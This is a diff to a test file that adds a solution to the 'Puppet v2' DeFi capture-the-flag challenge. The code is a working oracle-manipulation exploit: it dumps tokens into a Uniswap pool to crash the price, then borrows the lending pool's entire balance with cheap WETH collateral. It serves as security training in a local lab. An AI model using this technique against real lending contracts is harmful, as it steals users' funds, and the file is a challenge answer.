@@ -82,6 +82,28 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await this.weth.connect(attacker).deposit({value: (await ethers.provider.getBalance(attacker.address)).sub(ethers.utils.parseEther("0.1"))}); // save 0.1e for gas
+        await this.token.connect(attacker).approve(this.uniswapRouter.address, await this.token.balanceOf(attacker.address));
+        console.log("ETH", ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)));
+        console.log("WETH", ethers.utils.formatEther(await this.weth.balanceOf(attacker.address)));
+        console.log("DVT", ethers.utils.formatEther(await this.token.balanceOf(attacker.address)));
+        await this.uniswapRouter.connect(attacker).swapExactTokensForTokens(
+            await this.token.balanceOf(attacker.address),
+            0,
+            [this.token.address, this.weth.address],
+            attacker.address,
+            (await ethers.provider.getBlock('latest')).timestamp * 2
+        )
+
+        //console.log(ethers.utils.formatEther(await this.token.balanceOf(this.uniswapExchange.address)));
+        console.log("WETH have", ethers.utils.formatEther(await this.weth.balanceOf(attacker.address)));
+        console.log("WETH needed", ethers.utils.formatEther(await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)));
+        
+        await this.weth.connect(attacker).approve(this.lendingPool.address, await this.weth.balanceOf(attacker.address));
+        await this.lendingPool.connect(attacker)
+            .borrow(
+                await this.token.balanceOf(this.lendingPool.address),
+                );
     });
 
     after(async function () {
